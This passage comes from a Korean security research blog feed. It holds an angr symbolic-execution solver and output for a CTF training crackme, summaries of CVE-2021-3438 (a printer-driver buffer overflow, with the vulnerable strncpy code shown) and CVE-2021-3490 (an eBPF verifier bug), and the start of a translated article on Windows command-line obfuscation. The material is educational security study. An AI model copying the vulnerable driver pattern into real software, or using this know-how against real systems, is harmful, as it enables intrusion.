&#xC704;&#xC5D0;&#xC11C; IDA&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD558;&#xB098;&#xD558;&#xB098; &#xB9E4;&#xD551;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xCD9C;&#xB825;&#xC744; &#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;&#x2026; &#xC6D0;&#xB798; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>solution0 = solution_state.se.eval(password0,cast_to=str)</code> &#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC774;&#xAC8C; &#xC774;&#xB300;&#xB85C; &#xC4F0;&#xBA74; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#xC65C;&#xC778;&#xC9C0;&#xB294; &#xBAA8;&#xB974;&#xACA0;&#xB294;&#xB370; &#xBB38;&#xC790;&#xC5F4;&#xB85C;&#xC758; &#xCE90;&#xC2A4;&#xD305;&#xC744; &#xC9C0;&#xC6D0;&#xC744; &#xC548;&#xD55C;&#xB2E4;&#xB294;&#xB370;&#x2026;. &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694;. &#xD639;&#xC2DC; &#xD574;&#xACB0;&#xD558;&#xC2E0; &#xBD84;&#xC774; &#xACC4;&#xC2DC;&#xB2E4;&#xBA74; &#xB313;&#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB0E5; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC774; &#xBB38;&#xC81C;&#xB3C4; &#xB05D;!</p><h2 id="sol05-py"><a href="#sol05-py" class="headerlink" title="sol05.py"></a>sol05.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x080485FE</span>  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">64</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">64</span>)  password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, <span class="hljs-number">64</span>)  password3 = claripy.BVS(<span class="hljs-string">&apos;password3&apos;</span>, <span class="hljs-number">64</span>)  password0_address = <span class="hljs-number">0x0A1BA1C0</span>  initial_state.memory.store(password0_address, password0)  password1_address = <span class="hljs-number">0xA1BA1C8</span>  initial_state.memory.store(password1_address, password1)  password2_address = <span class="hljs-number">0xA1BA1D0</span>  initial_state.memory.store(password2_address, password2)  password3_address = <span class="hljs-number">0xA1BA1D8</span>  initial_state.memory.store(password3_address, password3)  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0, cast_to=bytes)    solution1 = solution_state.se.eval(password1, cast_to=bytes)    solution2 = solution_state.se.eval(password2, cast_to=bytes)    solution3 = solution_state.se.eval(password3, cast_to=bytes)        solution = <span class="hljs-string">&apos;{} {} {} {}&apos;</span>.format(solution0, solution1, solution2, solution3)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol05.py ./<span class="hljs-number">05</span>_angr_symbolic_memoryWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">179</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>,<span class="hljs-number">180</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048601</span> (main+<span class="hljs-number">0x59</span> <span class="hljs-keyword">in</span> <span class="hljs-number">05</span>_angr_symbolic_memory (<span class="hljs-number">0x8048601</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">33</span>,<span class="hljs-number">925</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;NAXTHGNR&apos;</span> <span class="hljs-string">b&apos;JVSFTPWE&apos;</span> <span class="hljs-string">b&apos;LMGAUHWC&apos;</span> <span class="hljs-string">b&apos;XMDCPALU&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">05</span>_angr_symbolic_memoryEnter the password: NAXTHGNR JVSFTPWE LMGAUHWC XMDCPALUGood Job.</code></pre><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC77C;&#xB2E8; &#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE00;&#xC5D0; &#xAE00;&#xC528;&#xB294; &#xB9CE;&#xC740;&#xB370; &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xCF54;&#xB4DC;&#xAC00; &#xB9CE;&#xC544;&#xC11C; &#xC2A4;&#xC555;&#xC774; &#xC880;&#x2026; &#xD558;&#xD558; &#xADF8;&#xB798;&#xC11C; &#xC774;&#xB9CC; &#xB04A;&#xC73C;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4; ^^</p><p>&#xC77C;&#xB2E8; &#xD300;&#xC7A5;&#xB2D8;&#xC774; &#xBD80;&#xC0C1; &#xC911;&#xC774;&#xC2DC;&#xB77C; &#xB0A8;&#xB294; &#xB0A0;&#xC9DC;&#xC5D0; &#xC81C; &#xAE00;&#xC744; &#xB610; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xCC28;&#xD53C; &#xB0A8;&#xC740; &#xBB38;&#xC81C;&#xB4E4;&#xB3C4; &#xD6C4;&#xB531; &#xD480; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774;&#xB2C8;&#xAE4C; &#xBE60;&#xB978; &#xD15C;&#xD3EC;&#xB85C; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC544; &#xADFC;&#xB370; &#xC774;&#xBC88; &#xAE00; &#xC4F0;&#xBA74;&#xC11C; &#xB290;&#xB080;&#xAC8C; &#xBB38;&#xC81C; &#xD478;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; &#xAE00; &#xC4F0;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xB294;&#xB4EF;&#x2026;) &#xC5BC;&#xB978; CTF &#xBB38;&#xC81C;&#xB3C4; &#xD480;&#xC5B4;&#xC57C;&#xC8E0;! &#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xD3B8;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC870;-&#xBC14;!(&#xC870;&#xCEE4; &#xBC14;&#xC774;&#xB77C;&#xB294; &#xB73B;)</p><p><img src="/2021/08/04/j0ker/angr_part3/1628066515.gif" alt="./angr_part3/1628066515.gif"></p><blockquote><p>&#xD1F4;&#xADFC;&#xAE38;&#xC5D0; &#xB2F4;&#xBC30; &#xD55C;&#xB300; &#x3146;&#x3145;&#x314C;&#x314A;</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>angr</tag>
      
      <tag>exploit</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>newbie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3438: Samsung,HP 프린터 드라이버의 Buffer Overflow 취약점</title>
    <link href="/2021/08/03/l0ch/2021-08-03/"/>
    <url>/2021/08/03/l0ch/2021-08-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://voidsec.com/root-cause-analysis-of-cve-2021-3438/">Root Cause Analysis of a Printer&#x2019;s Drivers Vulnerability CVE-2021-3438</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Samsung, HP, Xerox </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Samsung, HP, Xerox &#xC0AC;&#xC5D0;&#xC11C; 16&#xB144; &#xC804; &#xBC30;&#xD3EC;&#xB41C; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD504;&#xB9B0;&#xD130;&#xC758; &#xD575;&#xC2EC; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778; Serial Port Driver <code>SSPORT.sys</code> &#xC758; IOCTL <code>0x9C402408</code> &#xB8E8;&#xD2F4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> GlobalBuffer[<span class="hljs-number">4096</span>];<span class="hljs-function">NTSTATUS <span class="hljs-title">SioctlDeviceControl</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span></span><span class="hljs-function"></span>{    NTSTATUS status = STATUS_SUCCESS;    <span class="hljs-keyword">size_t</span> datalen = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;This String is from Device Driver@@@@@ !!!&quot;</span>) + <span class="hljs-number">1</span>;    PIO_STACK_LOCATION irpSP = IoGetCurrentIrpStackLocation(Irp);    ULONG inBufLength = irpSP-&gt;Parameters.DeviceIoControl.InputBufferLength;    ULONG outBufLength = irpSP-&gt;Parameters.DeviceIoControl.OutputBufferLength;    <span class="hljs-keyword">if</span> (!inBufLength || !outBufLength) {        status = STATUS_INVALID_PARAMETER;        <span class="hljs-keyword">goto</span> End;    }    <span class="hljs-keyword">switch</span> (irpSP-&gt;Parameters.DeviceIoControl.IoControlCode) {        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402408</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)</span>        {            <span class="hljs-keyword">char</span>* inBuf = (<span class="hljs-keyword">char</span>*)Irp-&gt;AssociatedIrp.SystemBuffer;            <span class="hljs-keyword">char</span>* outBuf = (<span class="hljs-keyword">char</span>*)Irp-&gt;AssociatedIrp.SystemBuffer;            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(inBuf, <span class="hljs-string">&quot;AA&quot;</span>))            {                <span class="hljs-built_in">strncpy</span>(GlobalBuffer, inBuf, inBufLength); <span class="hljs-comment">//Vulnerability</span>            }            <span class="hljs-keyword">else</span>            {                inBuf = GlobalBuffer;            }            <span class="hljs-built_in">strncpy</span>(outBuf, inBuf, outBufLength);            Irp-&gt;IoStatus.Information = outBufLength &lt; datalen ? outBufLength : datalen;             <span class="hljs-keyword">break</span>;         }         <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402401</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x900, METHOD_IN_DIRECT, FILE_ANY_ACCESS)</span>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C402406</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x901, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)</span>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x9C40240F</span>: <span class="hljs-comment">// CTL_CODE(40000, 0x903, METHOD_NEITHER, FILE_ANY_ACCESS) </span>            <span class="hljs-keyword">break</span>;         <span class="hljs-keyword">default</span>:             status = STATUS_INVALID_DEVICE_REQUEST;             <span class="hljs-keyword">break</span>;    } End:     Irp-&gt;IoStatus.Status = status;    IofCompleteRequest(Irp, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> status;}</code></pre><p><code>strncpy</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>inBuf</code>&#xC758; &#xAC12;&#xC744; <code>inBufLength</code>&#xC758; &#xD06C;&#xAE30;&#xB9CC;&#xD07C;  <code>GlobalBuffer</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; <code>inBuf</code>&#xC640; <code>inBufLength</code> &#xAC12;&#xC744; IOCTL &#xC694;&#xCCAD;&#xC2DC; <code>UserBuffer</code> &#xC5D0; &#xB530;&#xB77C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>.data</code> &#xC139;&#xC158;&#xC5D0; &#xC815;&#xC758;&#xB41C; 4096 &#xD06C;&#xAE30;&#xC758;  <code>GlobalBuffer</code>&#xB97C; &#xB118;&#xC5B4; <code>.pdata</code> &#xC139;&#xC158;&#xAE4C;&#xC9C0; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xC139;&#xC158;&#xC774; &#xC77D;&#xAE30; &#xC804;&#xC6A9;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xB85C;&#xCEEC; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(Dos) &#xC678;&#xC758; &#xC720;&#xD6A8;&#xD55C; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB294; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xBC30;&#xD3EC;&#xB41C; 2005&#xB144; &#xC774;&#xD6C4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC545;&#xC6A9;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>samsung</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>printer driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3490: Kernel Pwning with eBPF: a Love Story</title>
    <link href="/2021/08/02/fabu1ous/2021-08-02/"/>
    <url>/2021/08/02/fabu1ous/2021-08-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">Kernel Pwning with eBPF: a Love Story</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubuntu 20.10</p><p>kernel 5.8.0-25.26 ~ 5.8.0-52.58</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; Verifier&#xC640; BPF instruction&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Verifier&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC640; &#xADF8; &#xAC12;&#xB4E4;&#xC758; &#xD5C8;&#xC6A9; &#xBC94;&#xC704;(&#xC774;&#xD558; range)&#xB4F1;&#xC744; &#xCD94;&#xC801;&#xD574; memory load&#xC640; store&#xC758; out-of-bound &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. 32-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; 64-bit range&#xB97C; &#xAC16;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB07C;&#xB9AC;&#xC758; Bitwise &#xC5F0;&#xC0B0;(BPF_AND, BPF_OR, BPF_XOR)&#xC774; &#xB05D;&#xB09C; &#xD6C4; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; 32-bit range&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD574; out-of-bound read/write&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs rust"><span class="hljs-keyword">static</span> void scalar_min_max_and(<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span></span> *dst_reg,                              <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span></span> *src_reg){    <span class="hljs-built_in">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);    <span class="hljs-built_in">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);    s64 smin_val = src_reg-&gt;smin_value;    <span class="hljs-built_in">u64</span> umin_val = src_reg-&gt;umin_value;    <span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) {            __mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);            <span class="hljs-keyword">return</span>;    }  ...}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>ebpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Windows Command-Line Obfuscation</title>
    <link href="/2021/08/01/idioth/windows_cmd_obfuscation/"/>
    <url>/2021/08/01/idioth/windows_cmd_obfuscation/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth &#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC624;&#xB298;&#xBD80;&#xD130; Hooking&#xC5D0; &#xB300;&#xD55C; &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD558;&#xC600;&#xC73C;&#xB098; &#xBAA8;&#xC544;&#xB454; &#xC790;&#xB8CC;&#xB97C; &#xCDE8;&#xD569;&#xD558;&#xACE0; &#xAD6C;&#xC0C1;&#xD558;&#xB358; &#xC911;&#xC5D0; &#xAF2C;&#xC5EC; &#xBC84;&#xB824;&#xC11C; &#xC77D;&#xC73C;&#xB824;&#xACE0; &#xAC00;&#xC838;&#xB2E4; &#xB193;&#xC558;&#xB358; &#xAC83; &#xC911; &#xD558;&#xB098;&#xB97C; &#xBC88;&#xC5ED;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7A0;&#xAE50; &#xD734;&#xC2DD;&#xD558;&#xBA74;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xAD6C;&#xC0C1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD558;&#xACE0; &#xC2DC;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation">Windows Command-Line Obfuscation</a></p></blockquote><p><strong>TL;DR</strong> - &#xB9CE;&#xC740; Windows &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD3B8;&#xC758;&#xC131;&#xC774;&#xB098; &#xD638;&#xD658;&#xC131;&#xC744; &#xC704;&#xD574; &#xAC19;&#xC740; command line&#xC744; &#xD45C;&#xD604;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;. command-line &#xC778;&#xC790;&#xAC00; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB2E4; &#xBCF4;&#xB2C8; &#xD2B9;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAE30;&#xAC00; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC740; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; 40&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xAE30;&#xBCF8; Windows &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; command-line &#xB09C;&#xB3C5;&#xD654;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xCDE8;&#xC57D;&#xD55C;&#xC9C0; &#xBCF4;&#xC5EC;&#xC8FC;&#xACE0; &#xB2E4;&#xB978; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD234;&#xC744; &#xC18C;&#xAC1C;&#xD55C;&#xB2E4;.</p><h1 id="Command-line-arguments"><a href="#Command-line-arguments" class="headerlink" title="Command-line arguments"></a>Command-line arguments</h1><blockquote><p>He who wishes to be obeyed must know how to commad</p><ul><li>Machiavelli (Discourses on Livy III, Chapter XXII)</li></ul></blockquote><p>&#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xAC8C;&#xB294; 16&#xC138;&#xAE30;&#xC758; &#xC774; &#xC778;&#xC6A9;&#xBB38;&#xC774; &#xB9CE;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xAC8C; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB294; &#x2018;command line&#x2019; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB97C; &#xAC00;&#xC9C4;&#xB2E4;. command line&#xC740; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD750;&#xB984;&#xC744; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4; &#xC9D1;&#xD569;, &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;, &#xC785;&#xB825; &#xAE30;&#xB2A5;&#xC740; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xD575;&#xC2EC; &#xAC1C;&#xB150;&#xC774;&#xB2E4;.</p><p>&#xCEF4;&#xD4E8;&#xD305;&#xC5D0; &#xB300;&#xD55C; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xC5ED;&#xD560;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; command line&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xBD88;&#xB7EC;&#xC57C;&#xD558;&#xB294; &#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xD569;&#xC758;&#xC810;&#xC774; &#xC5C6;&#xB2E4;. &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB294; command line arguments, parameters, options, flags, switches&#xAC00; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC758;&#xBBF8;&#xB97C; &#xAC16;&#xB294;&#xB2E4;&#xACE0; &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C; 